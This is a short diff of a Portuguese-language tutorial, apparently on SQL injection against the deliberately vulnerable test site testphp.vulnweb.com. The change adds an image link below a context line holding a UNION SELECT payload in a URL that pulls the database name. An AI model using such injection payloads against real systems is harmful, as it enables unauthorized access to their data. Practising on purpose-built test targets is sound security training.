@@ -27,6 +27,8 @@ que nos traria a informação da seguinte maneira
 ![image](https://github.com/user-attachments/assets/7f501c8a-6a20-4771-862d-00567a65c4f9)
     Para descobrir o nome do banco de dados utilizamos o Database(), então seguindo a mesma logica
 testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,database(),3,4,5,6,7,8,9,10,11
+![image](https://github.com/user-attachments/assets/0ef768a6-b53b-4d4d-8f58-ba100fdf5343)
+
 
 
 
